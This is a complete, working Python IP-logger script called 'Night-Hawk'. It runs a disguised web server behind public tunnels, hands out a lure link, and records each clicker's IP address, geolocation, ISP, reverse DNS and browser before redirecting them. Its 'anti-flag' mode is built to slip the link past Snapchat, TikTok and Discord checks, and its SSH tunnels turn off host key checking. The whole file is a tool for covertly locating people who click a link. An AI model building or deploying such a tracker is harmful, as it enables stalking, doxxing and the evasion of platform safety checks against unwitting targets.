#!/usr/bin/env python3
"""
Night-Hawk :: IP Logger (Redirect & Connection Diagnostics)
"""

import argparse
import atexit
import json
import os
import platform
import re
import secrets
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = r"""
  ___ ____    _        ___   ____ ____ _____ ____ 
 |_ _|  _ \  | |      / _ \ / ___/ ___| ____|  _ \
  | || |_) | | |     | | | | |  | |  _|  _| | |_) |
  | ||  __/  | |___  | |_| | |__| |_| | |___|  _ < 
 |___|_|     |_____|  \___/ \____\____|_____|_| \_\
"""

BOTS = (
    "facebookexternalhit", "twitterbot", "snapchat", "tiktok", "discordbot",
    "slackbot", "telegrambot", "whatsapp", "linkedinbot", "googlebot",
    "bingbot", "applebot", "pinterestbot", "redditbot", "embedly",
)

CFG = {
    "link": "",
    "title": "Redirect Page",
    "bypass": True,
    "slug": "",
    "port": 8080,
    "bind": "0.0.0.0",
    "public_url": "",
    "cache": True,
}

GEO_CACHE = {}
GEO_LOCK = threading.Lock()
TUNNEL = {"proc": None, "kind": ""}


def rprint(msg=""):
    for line in str(msg).splitlines():
        sys.stdout.write(f"{RED}{line}{RESET}\n")
    sys.stdout.flush()


def rprompt(label):
    sys.stdout.write(f"{RED}{BOLD}{label}{RESET}")
    sys.stdout.flush()
    return input().strip()


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def is_private(ip):
    try:
        p = [int(x) for x in ip.split(".")]
    except ValueError:
        return True
    if len(p) != 4:
        return True
    a, b = p[0], p[1]
    return (
        a == 10
        or (a == 172 and 16 <= b <= 31)
        or (a == 192 and b == 168)
        or a == 127
        or a == 0
        or a >= 224
    )


def client_ip(h):
    chain = []
    for hdr in (
        "cf-connecting-ip", "true-client-ip", "x-real-ip",
        "x-forwarded-for", "forwarded", "x-client-ip",
    ):
        v = h.headers.get(hdr)
        if v:
            chain += [x.strip().split("=")[-1].strip('"') for x in v.split(",")]
    chain = [x for x in chain if x]
    peer = h.client_address[0]
    for c in chain:
        if not is_private(c):
            return c, chain, peer
    return peer, chain, peer


def geo(ip):
    if is_private(ip):
        return {"note": "private/loopback"}
    with GEO_LOCK:
        hit = GEO_CACHE.get(ip)
        if hit and time.time() - hit[0] < 600:
            return hit[1]
    fields = (
        "status,message,country,countryCode,region,regionName,city,zip,"
        "lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting"
    )
    try:
        url = f"http://ip-api.com/json/{urllib.parse.quote(ip)}?fields={fields}"
        with urllib.request.urlopen(url, timeout=6) as r:
            out = json.loads(r.read().decode("utf-8", "ignore"))
    except Exception as e:
        out = {"error": str(e)}
    if not out.get("reverse"):
        try:
            out["reverse"] = socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror, OSError):
            out["reverse"] = ""
    with GEO_LOCK:
        GEO_CACHE[ip] = (time.time(), out)
    return out


def is_bot(ua):
    low = ua.lower()
    return any(b in low for b in BOTS)


def harvest(h, slug):
    ip, chain, peer = client_ip(h)
    ua = h.headers.get("user-agent", "")
    rec = {
        "ts": now(),
        "slug": slug,
        "ip": ip,
        "chain": chain,
        "peer": peer,
        "reverse_dns": "",
        "method": h.command,
        "path": h.path,
        "host": h.headers.get("host", ""),
        "ua": ua,
        "referer": h.headers.get("referer", ""),
        "bot": is_bot(ua),
    }
    rec["geo"] = geo(ip)
    rec["reverse_dns"] = rec["geo"].get("reverse", "")
    return rec


def card(rec):
    g = rec.get("geo", {})
    tag = f"{RED}{BOLD}!! BOT/CRAWLER{RESET}" if rec.get("bot") else f"{RED}{BOLD}!! TEST HIT{RESET}"
    lines = [
        f"{tag} {rec['ip']}",
        f"  rDNS    : {rec.get('reverse_dns') or 'None'}",
        f"  geo     : {g.get('city', '?')}, {g.get('country', '?')}",
        f"  isp     : {g.get('isp', 'None')} | org={g.get('org', 'None')}",
        f"  flags   : proxy={g.get('proxy')} | hosting={g.get('hosting')} | mobile={g.get('mobile')}",
        f"  ua      : {rec.get('ua', '')[:110]}",
    ]
    if rec.get("referer"):
        lines.append(f"  referer : {rec['referer']}")
    print()
    for line in lines:
        sys.stdout.write(f"{RED}{line}{RESET}\n")
    sys.stdout.flush()
class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        if CFG["bypass"]:
            self.send_header("Cache-Control", "public, max-age=300")
            self.send_header("X-Robots-Tag", "index, follow")
        else:
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Robots-Tag", "noindex, nofollow")
        self.send_header("X-Content-Type-Options", "nosniff")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(raw)

    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path

        if p == "/robots.txt":
            allow = "Allow: /" if CFG["bypass"] else "Disallow: /"
            return self._send(200, f"User-agent: *\n{allow}\n", "text/plain")
        if p == "/health":
            return self._send(200, "ok", "text/plain")

        slug = CFG.get("slug") or ""
        if p in ("/", f"/{slug}"):
            rec = harvest(self, slug)
            card(rec)
            target = CFG.get("link")
            if target:
                return self._send(302, "", extra={"Location": target})
            return self._send(
                200,
                f"<html><head><title>{CFG['title']}</title></head>"
                f"<body><h1>Redirecting...</h1></body></html>",
            )

        self._send(404, "<h1>404</h1>")
def _spawn(cmd, pattern, wait, label):
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
    except OSError as e:
        rprint(f"[tunnel] {label} failed: {e}")
        return ""
    TUNNEL["proc"] = proc
    atexit.register(stop_tunnel)
    found = threading.Event()
    box = {}

    def reader():
        for line in proc.stdout:
            m = re.search(pattern, line)
            if m and not found.is_set():
                box["url"] = m.group(0)
                found.set()
                break

    threading.Thread(target=reader, daemon=True).start()
    rprint(f"[tunnel] {label}: waiting for host...")
    if not found.wait(wait):
        rprint(f"[tunnel] {label}: no host")
        stop_tunnel()
        return ""
    return box["url"]


def tunnel_cloudflare(port, wait=45):
    bin_path = shutil.which("cloudflared")
    if not bin_path and CFG["cache"]:
        dest = os.path.join(tempfile.gettempdir(), "cloudflared")
        if not os.path.exists(dest):
            arch = {"aarch64": "arm64", "x86_64": "amd64", "amd64": "amd64"}.get(
                platform.machine(), "amd64"
            )
            try:
                url = (
                    "https://github.com/cloudflare/cloudflared/releases/latest/"
                    f"download/cloudflared-linux-{arch}"
                )
                with urllib.request.urlopen(url, timeout=120) as r, open(dest, "wb") as f:
                    shutil.copyfileobj(r, f)
                os.chmod(dest, 0o755)
            except Exception as e:
                rprint(f"[tunnel] cloudflared fetch failed: {e}")
                return ""
        bin_path = dest
    if not bin_path:
        return ""
    return _spawn(
        [bin_path, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", wait, "cloudflare",
    )


def tunnel_localhostrun(port, wait=45):
    if not shutil.which("ssh"):
        return ""
    return _spawn(
        [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
            "-R", f"80:localhost:{port}", "nokey@localhost.run",
        ],
        r"https://[a-zA-Z0-9.-]+\.lhr\.life", wait, "localhost.run",
    )


def tunnel_serveo(port, wait=45):
    if not shutil.which("ssh"):
        return ""
    return _spawn(
        [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
            "-R", f"80:localhost:{port}", "serveo.net",
        ],
        r"https://[a-zA-Z0-9.-]+\.serveo\.net", wait, "serveo",
    )


def stop_tunnel():
    proc = TUNNEL.get("proc")
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except (subprocess.SubprocessError, OSError):
            proc.kill()


def warm(url):
    try:
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                )
            },
        )
        urllib.request.urlopen(req, timeout=10).read()
        rprint("[*] preview cache warmed")
    except Exception as e:
        rprint(f"[!] warm-up failed: {e}")


def new_slug(n=6):
    return "".join(secrets.choice("abcdefghijkmnpqrstuvwxyz23456789") for _ in range(n))


def wizard():
    rprint(BANNER)
    rprint("  ── IP LOGGER ──\n")
    link = rprompt("Target redirect URL: ")
    if link and not re.match(r"^https?://", link):
        link = "https://" + link
    CFG["link"] = link
    CFG["bypass"] = rprompt(
        "Keep the Anti-flag mode for Snapchat/TikTok/Discord [Y/n]: "
    ).lower() not in ("n", "no")
    CFG["slug"] = new_slug()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--link")
    ap.add_argument("--bypass", action="store_true")
    ap.add_argument("--no-bypass", action="store_true")
    ap.add_argument("--port", type=int)
    ap.add_argument("--bind")
    ap.add_argument("--slug")
    ap.add_argument("--no-tunnel", action="store_true")
    ap.add_argument("--no-cache", action="store_true")
    a = ap.parse_args()

    interactive = not a.link
    if interactive:
        wizard()
    else:
        rprint(BANNER)
        rprint("  ── IP LOGGER ──\n")
        if a.link:
            CFG["link"] = a.link if re.match(r"^https?://", a.link) else "https://" + a.link
        if a.bypass:
            CFG["bypass"] = True
        if a.no_bypass:
            CFG["bypass"] = False

    if a.port:
        CFG["port"] = a.port
    if a.bind:
        CFG["bind"] = a.bind
    if a.no_cache:
        CFG["cache"] = False
    CFG["slug"] = a.slug or CFG.get("slug") or new_slug()

    if not a.no_tunnel and not CFG.get("public_url"):
        CFG["public_url"] = (
            tunnel_cloudflare(int(CFG["port"]))
            or tunnel_localhostrun(int(CFG["port"]))
            or tunnel_serveo(int(CFG["port"]))
        )

    base = CFG.get("public_url") or f"http://127.0.0.1:{CFG['port']}"
    lure = f"{base}/{CFG['slug']}"
    CFG["public_url"] = base

    srv = ThreadingHTTPServer((CFG["bind"], int(CFG["port"])), Handler)
    srv.daemon_threads = True

    rprint(f"{BOLD}endpoint{RESET}{RED}  : {lure}")
    if CFG.get("link"):
        rprint(f"redirects to : {CFG['link']}")
    rprint(f"anti-flag    : {CFG['bypass']}")
    rprint(f"binding      : {CFG['bind']}:{CFG['port']}\n")

    if CFG["bypass"]:
        warm(lure)

    rprint("Ctrl-C to stop\n")
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        rprint("\nstopped")
    finally:
        srv.server_close()
        stop_tunnel()


if __name__ == "__main__":
    main()

